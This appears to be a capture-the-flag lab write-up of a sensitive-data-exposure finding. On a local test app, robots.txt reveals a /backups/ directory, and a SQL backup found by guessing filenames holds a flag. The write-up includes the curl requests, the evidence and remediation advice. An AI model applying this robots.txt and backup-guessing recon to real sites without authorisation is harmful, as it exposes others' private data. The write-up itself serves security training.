# Recon — Sensitive Data Exposure (Exposed Backup)
- Endpoint: GET /robots.txt  ->  GET /backups/vulnhub.sql.bak
- Severity: High
- Flag: FLAG{exposure_323584a9b452}
## Request / payload / command
```
curl -s http://127.0.0.1:5000/robots.txt          # reveals Disallow: /backups/
curl -s http://127.0.0.1:5000/backups/vulnhub.sql.bak
```
## What happened
`robots.txt` disclosed a "hidden" directory (`Disallow: /backups/`). That directory
is served directly by the app, and a database backup was left in it. Requesting the
backup returned a SQL dump containing a secret (an `INSERT INTO secrets` row) with
the flag. robots.txt advertised the sensitive location rather than protecting it.
Discovery: robots.txt gave `/backups/`; the backup filename was found after brute
guesses plus recon of the `/backups/<path>` route, landing on `vulnhub.sql.bak`.
## Evidence
```
# GET /robots.txt:
User-agent: *
Disallow: /backups/

# GET /backups/vulnhub.sql.bak:
-- database backup (should NOT be world-readable)
-- left in /backups/ by mistake
INSERT INTO secrets VALUES ('FLAG{exposure_323584a9b452}');
```
## Remediation
Do not store backups/secrets under the web root or serve the backups directory;
remove the exposed dump, and never rely on robots.txt to "hide" sensitive paths.
